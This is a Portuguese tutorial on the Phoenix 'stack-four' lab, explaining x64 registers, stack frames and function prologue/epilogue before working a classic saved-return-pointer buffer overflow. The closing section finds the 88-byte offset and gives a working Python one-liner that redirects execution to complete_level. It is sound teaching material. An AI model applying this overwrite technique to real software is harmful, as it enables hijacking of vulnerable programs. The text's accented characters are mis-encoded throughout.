# üéØ Objetivo
O buffer overflow (BOF) vai nos permitir alterar o saved return pointer (SRP) e redirecionar a execu√ß√£o do programa.

Esse desafio est√° nos preparando para o pr√≥ximo, no qual nos redirecionaremos a execu√ß√£o para o nosso pr√≥prio c√≥digo, e teremos um exploit de verdade! :D

Esse tipo de exploit era vi√°vel nos anos 90, quando mecanismos de prote√ß√£o n√£o existiam. Por isso √© chamado de buffer overflow cl√°ssico (ou SRP BOF, se voc√™ gosta de siglas)! :D

Se voc√™ souber ingl√™s, vale a pena dar uma lida nesse post de 1996 no Phrack: [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) !

# üõ∏ Conhecimento preliminar
Se tem uma se√ß√£o inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de seguran√ßa est√° firme e travado,
e mantenha as m√£os, pernas e canecas de caf√© dentro do ve√≠culo durante todo o percurso!

3...2...1....

## ü§ñ Assembly
Recursos adicionais:
[x64 Cheat Sheet - PDF](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&usg=AOvVaw384MVXQDBtyM1pPW3LeZrW)
[Harvard CS61](https://cs61.seas.harvard.edu/site/2018/Asm1/)
[Wikipedia Registers](https://en.m.wikipedia.org/wiki/Processor_register)
[GPR in 8086](https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:~:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers) 
[Registradores - Introdu√ß√£o Engenharia Reversa](https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores)


Eu pretendo fazer uma serie de tutorias dedicada √† assembly (ASM), por√©m isso √© para o futuro...

Eu vou usar sintaxe intel, pq √© a melhor e se alguem te disser o contr√°rio, a pessoa ta mentindo >:( !!!!

> ASM √© uma representa√ß√£o legivel dos 0s e 1s das instru√ß√µes do computador. 
> Ela pode ser transformada em machine code (c√≥digo de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!

Ent√£o como voc√™ pode imaginar, √© bem complicado, e a minha maneira de explicar pode n√£o funcionar para voc√™... Ent√£o vai com calma, le de outras fontes, assite 
videos,... vai demorar um bom tempo pra ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo

### üì¶ Register (Registros / Registradores)
> Registers s√£o peda√ßos de mem√≥ria que ficam dentro do chip do processador, semelhante a mem√≥ria RAM, por√©m extremamente r√°pidos e pequenos. O seu tamanho √© um dos determinantes da arquitetura (32 bits = register de 4 bytes, 64 bits = register de 8 bytes)
Esses registers s√£o semelhantes √† vari√°veis, no sentido que armazenam valores, podem ser alterados e lidos.

#### üåç General Purpose Registers (GPR) ( Registro de Prop√≥sito Geral )
Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo). 
> Por exemplo: AX (16 bits, endere√ßos: 0 a 15) (uma vers√£o antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).

O prop√≥sito deles costuma ser, mas n√£o exclusivamente √©:
```
RAX: Acumulador   -> Usado para opera√ß√µes l√≥gicas ou aritm√©ticas 
RBX               -> Pointer para dados
RCX: Contagem     -> Usado em loops e outras opera√ß√µes c√≠clicas 
RDX: Dados        -> Multiplica√ß√£o, input/output
R8 a 15           -> voc√™ s√≥ precisa saber que eles existem
```
Alem disso, s√£o usados para passar os argumentos para fun√ß√µes (explica√ß√£o em breve)
#### üí´ Address Register ( armazenam endere√ßos da stack )
```
RSP: Stack Pointer       -> Aponta para o topo da stack
RBP: Base Pointer        -> Aponta para a base da stack
RIP: Instruction Pointer -> Aponta para a instru√ß√£o que est√° sendo executada 
```

#### üèÅ RFLAG
O register RFLAG armazena flags: sinais que indicam resultados passados . Esses sinais s√£o 1 bit (0 ou 1)
```
Exemplos:

Posi√ß√£o    Nome         Descri√ß√£o 
0          Carry         Resultado estourou o limite de um inteiro sem sinal (o "vai-um" da matem√°tica)
6          Zero          A opera√ß√£o resultou em 0, usada em compara√ß√µes
11         Overflow      Estourou o limite de um inteiro com sinal
```
#### üß† Ap√™ndice - Curiosidade : Nomenclatura hist√≥rica
![](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse3.mm.bing.net%2Fth%3Fid%3DOIP.kkrG2L61YUbGLxwv5UcoPQHaFj%26pid%3DApi&f=1)
Eu vou usar o RAX como exemplo!
```
Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamdo AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AXs
Em computadores 64 bits, ele √© chamado RAX e tem o tamanho de 2 EAXs

Para propositos de retro-compatibilidade, nos ainda podemos usar, por exemplo, EAX em um computador 64 bits
Por tras das cenas, o computador interpreta EAX como a segunda metade do RAX

Ent√£o n√£o estranhe caso alguem fale de EIP numa arquitetura x64, pois na linguagem informal n√£o faz diferen√ßa
Mas caso voc√™ v√° analisar o register em um debugger, a diferen√ßa importa :D
```

### ‚ö° Instru√ß√µes
> Obs: os registers foram usados aleatoriamente, pois seu prop√≥sito na realidade n√£o √© relevante para a explica√ß√£o !

As instru√ß√µes s√£o o que o processador executa, por exemplo
``` 
add 0x4 0x1     -> adi√ß√£o 4 + 1 = 5
```
Na sintaxe intel, o "alvo" da opera√ß√£o vem primeiro e o "par√¢metro" depois

Caso os dois argumentos da instru√ß√£o sejam valores, a opera√ß√£o executara normalmente

Caso o **alvo** seja um **register**, o **resultado** da opera√ß√£o ser√° salvo nele 
``` 
add 0x4 0x1     -> adi√ß√£o 4 + 1 = 5
add rbp 0x10    -> rbp  vira  rbp + 0x10
add rbp 0x22    -> Adiciona 0x22 ao rbp 
```

```
sub 0x4 0x1     -> subtra√ß√£o 4 - 1 = 3
                 Caso fosse ao contr√°rio a ordem "alvo" "par√¢metro",
                 o resultado seria `-3` !
                 
sub rbp 0x10    -> rbp  vira  rbp - 0x10
sub rsp 0x10    -> Subtrai 0x10 de rsp
```

Algumas outras instru√ß√µes que ser√£o importantes
```
push -> Empurra o valor pro topo da Stack

pop  -> Tira o valor no topo da Stack e salva no alvo
     |---> pop      -> S√≥ remove o valor no topo da Stack
     |---> pop rbp  -> Remove o valor do topo e salva em rbp
      
mov  -> Move o valor do par√¢metro para o alvo
     |---> mov rbx 0x10   -> O valor de rbx vira 0x10
     |---> mov rbx rax    -> O valor de rbx vira o valor de rax
     |---> mov rax rbx    -> O valor de rax vira o valor de rbx

Usadas no ep√≠logo ( explicadas em breve )
           ret     -> retorna da fun√ß√£o ( em ess√™ncia √© s√≥ um "pop rip" )
           leave -> restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -> Operadores l√≥gicos, t√™m o mesmo comportamento de sub e add
                  |---> and rbp 0x10   -> rbp  vira  rbp & 0x10
                  |---> xor rsp 0x10   -> rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -> Move o RIP para aquela localiza√ß√£o incondicionalmente, equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -> jmp equal
             |---> Compara os valores; Se forem iguais da o jump (normalmente usado em conjunto com a ZERO_FLAG)

jmpLE  -> jmp less or equal   -> Menor ou igual   ‚â§
jmpGE -> jmp greater or equal -> Maior ou igual   ‚â•
```
Caso vc n√£o saiba os operadores l√≥gicos: [Wikipedia Operador L√≥gico](https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico)

### ü¶Ñ Fun√ß√µes, Pr√≥logo e Ep√≠logo
Agora t√° na hora de aprender **realmente** como essa tal de stack funciona, ent√£o √© bom dar uma revisada, n√©?
#### ‚òï Revis√£o 
```
- A stack √© como uma pilha de pratos: √∫ltimo a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A mem√≥ria √© representada de cabe√ßa pra baixo!
    - A base fica em um endere√ßo maior (parte de baixo)
    - O topo fica em um endere√ßo menor (parte de cima)
    - Portanto, a stack cresce em dire√ß√£o √† valores menores :D 

```
#### üñºÔ∏è Stack Frame ( Moldura da Stack )
Voc√™ se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D

O rbp indica a base da stack, e rsp o topo.

A regi√£o entre os dois √© chamada de stack frame: um peda√ßo da stack :D

A stack como um todo possui v√°rios stack frames, por√©m s√≥ um est√° ativo por vez (o indicado pelo rbp/rsp).

Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Pr√≥logo e Ep√≠logo, respectivamente.

> Obs: Quando voc√™ muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente 

Quando chamamos uma **fun√ß√£o()**, precisamos criar um frame novo para ela por meio de um Pr√≥logo, e salvar o endere√ßo do frame atual. Ao retornar, esse frame ser√° destru√≠do com um Ep√≠logo e o antigo ser√° restaurado !

Para a explica√ß√£o, vamos usar o seguinte pseudo-programa:
```
Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = "Ola! :D"
    y = "Assembly √© legal"

    print_dois(x, y)

    return
}
```
Agora vamos executar **main()**, **x** e **y** s√£o definidas e nos j√° sabemos como isso funciona, agora vamos chamar a fun√ß√£o, que √© aonde a m√°gica acontece !
#### üîí Pr√≥logo
- Se a fun√ß√£o recever argumentos, passar eles
Chamar a fun√ß√£o 
- Salvar o frame atual
- Criar novo frame
Executar a fun√ß√£o
##### Se a fun√ß√£o receber argumentos, salvar eles
Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:
```
(x, y)
push y
push x
```
Mas comumente, os argumentos s√£o passados pelos registers:
```
RAX (Valor retornado)
RDI (1¬∫ parametro)
RSI (2¬∫ parametro)
RDX (3¬∫ parametro)
Tem para o resto, mas se a sua fun√ß√£o recebe mais de 3 parametros,
tem algo de errado e voc√™ precisa reescrever essa porcaria hehehe :P
```

> Caso **main()** use um desses registers, vai ser nescess√°rio dar um push neles, e restaura-los no epilogo 
#### Salvar o frame atual
```
push RIP + 0x4 ; salva o RIP na stack, por√©m n√£o o valor atual, e sim o endere√ßo da pr√≥xima instru√ß√£o 
push RBP       ; salva o RBP
```
Atualmente, a stack est√° assim
```
rbp main            <- RSP   -
rip main                     | Frame de
                             | main()
... resto da stack  <- RBP   -
```
#### Criar novo frame
Agora, para criar um novo frame, precisamos subir o rbp at√© o rsp
```
mov rbp rsp ; Move o valor de rsp para rbp!
               Ou melhor : rbp "anda" at√© o rsp
```
Atualmente, a stack est√° assim
```
rbp main    <- RSP  e RBP apontam para a mesma localiz√ß√£o
rip main                   
... stack frame de main omitido           
```
Agora, precisamos **subtrair** de RSP para alocar espa√ßo na mem√≥ria para essa fun√ß√£o 
> A stack cresce para valores menores :)
```
sub rsp - 0x20 ; vamos supor que, para esse exemplo, a fun√ß√£o precisa de 32 bytes.
                    Portanto, vamos subtrair 32 bytes de RSP, para faze-lo "subir"
```
Atualmente, a stack est√° assim
```
...          <- RSP      -
Instru√ß√µes de print_dois |
...                      | Frame de
...                      | print_dois()
rbp main     <- RBP      -
rip main                   
...              
```
Com esse m√©todo de chamar fun√ß√£o, n√£o importa a localiza√ß√£o da mem√≥ria de quando a fun√ß√£o foi chamada, ela sempre vai executar da mesma maneira

> Esse processo pode ocorrer muitas vezes caso uma fun√ß√£o chame outra, no nosso exemplo, um novo frame seria criado para **print()**, print seria executada,
> e o frame destru√≠do ao retornar. Apos **print()** retornar, **print_dois continuara a execu√ß√£o normalmente! :)**

```
O prologo ent√£o pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a fun√ß√£o
```

#### üîë Ep√≠logo 
O epilogo √© bem mais simples que o prologo:
```
- Devolver memoria e restaurar RBP    -> leave   
- Restaurar RIP  e retornar           -> ret
```

Atualmente, a stack est√° assim
```
...          <- RSP      -
Instru√ß√µes               |
...                      | Frame de
...                      | print_dois()
rbp main     <- RBP      -
rip main                   
            
```
**leave**

Para devolver a memoria, precisamos mover RSP "para baixo: basta dar um `mov rsp rbp` ("andar" rsp at√© o rbp)

Atualmente, a stack est√° assim
```
...                    
Instru√ß√µes          A regi√£o n√£o √© apagada, pois consumiria processamento a toa!         
...                 O valores ficam largados l√° at√© uma nova fun√ß√£o escrever por cima deles...
                    Por isso que, ao analisar a stack, as vezes vemos "lixo" aleatorio
                    Eles pode ser ignorado pois nem est√° mais na stack
                          
rbp main  <- RBP e RSP - O topo da stack
rip main                                
```
Em seguida, vamos restaurar o rbp de main `pop rbp` (remover o valor no topo da stack (ver acima por referencia), e colocalo no alvo: **rbp**)
```
--- omitido ---
rip main      <- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instru√ß√£o
... resto de main
ret da main   <- RBP
```

**ret (return)**
ret vai restaurar o EIP de main com um `pop rip`
```
...
... main          <- RSP
call print_dois
proxima instru√ß√£o <- RIP
... resto de main
ret da main       <- RBP
```

Assim, o stack frame de main foi restaurado gra√ßas ao rbp e rip salvos ( o rip salvo √© chamado de **Saved Return Pointer (SRP)** )

# Caso voc√™ tenha viajado durante tudo isso, o que voc√™ precisa saber
Existem algumas variaveis especiais dentro do processador:
```
RSP: Stack Pointer       -> Aponta para o topo da stack
RBP: Base Pointer        -> Aponta para a base da stack
RIP: Instruction Pointer -> Aponta para a instru√ß√£o que est√° sendo executada 
```

O RIP e o RBP atuais s√£o salvos na stack quando chamamos uma fun√ß√£o, junto das outras variaveis:
```
buffer[64]
uns int qualquer usado na fun√ß√£o
....
rbp
rip
```

Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como **changeme** nos execicios anteriores, tambem conseguimos alterar o RIP salvo (SRP) e redirecionar a execu√ß√£o do programa!

# üî• Exploit
## üî¨ Analisar o programa
O programa contem 3 fun√ß√µes: complete_level, start_level e main

main printa a mensagem do come√ßo do nivel e chama start_level

complete_level √© a fun√ß√£o que precisamos chamar

start_level √© onde a magica acontece: **gets()** (insegura) √© chamada num buffer[64]

## ‚ÅâÔ∏è O compilador adicionou coisa???
Se colocarmos somente um byte:
```
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
```
A fun√ß√£o normalmente retorna para 0x40068d !
```
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*80" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
```
Nos colocamos mais de 64 bytes, conseguimos dar overflow, mas o rip n√£o mudou e mesmo assim teve seg fault.... QUE?!!!!

O compilador muitas vezes coloca coisas na stack por performance ou retrocompatibilidade!

Alem disso, nos exemplos passados o valor estava logo depois do buffer, agora tem pelo menos o RBP salvo, ent√£o precisamos levar isso em considera√ß√£o!

Em aplica√ß√µes mais complexas, essa diferen√ßa pode chegar a centenas de bytes.

Nos podemos encontrar o valor usando ferramentas como fuzzers ou geradores de padr√£o...

Como nosso exemplo √© simples, podemos fazer manualmente:
```
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*89" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*88" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
```
Isso quer dizer que apo≈õ 88 bytes, temos o SRP :D
## üè† Encontrar endere√ßo de complete_level
Voc√™ se lembra como faz? Nos usamos no execicio passado....
> cof cof objdump -d cof cof
```
Se vc quer tentar sozinhx, agora √© a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
```
Encontrar endere√ßo:
```
user@phoenix-amd64:/opt/phoenix/amd64$ objdump -d stack-four | grep complete_level
000000000040061d <complete_level>:
```
Exploit:
```
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*88 + '\x1d\x06\x40'" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

Esse foi um tutorial beeem longo, e com certeza o mais dificil! Se voc√™ chegou at√© aqui, parabens! :D
# üí´ Solu√ß√£o
```
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*88 + '\x1d\x06\x40'" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```
